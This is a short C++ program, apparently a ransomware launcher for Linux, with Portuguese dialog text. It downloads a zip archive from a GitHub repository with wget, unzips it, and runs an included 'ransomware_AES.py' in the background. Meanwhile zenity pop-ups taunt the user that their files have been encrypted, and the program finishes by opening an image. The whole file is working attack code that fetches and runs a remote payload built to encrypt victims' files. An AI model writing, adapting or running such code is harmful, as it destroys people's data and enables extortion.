#include <iostream>
#include <stdlib.h>

int main()
{	
	system("zenity --text --text \"Starting...\"");
	system("wget https://github.com/mateus-n00b/coffee/archive/master.zip");
	system("unzip master.zip");
	system("zenity --question --text \"Ola Mr. $USER, vamos jogar um jogo?\"");
	system("python coffee-master/ransomware_AES.py &");
	system("zenity --info --text \"Tanto faz! O jogo já começou...\" ; sleep 1");
	system("zenity --info --text \"Ahh, enquanto você estava lendo isso, eu criptografei seus arquivos!\"");
	system("zenity --info --text \"Txau...\" --width 200; eog coffee-master/noob.jpg &");
	return 0;
}
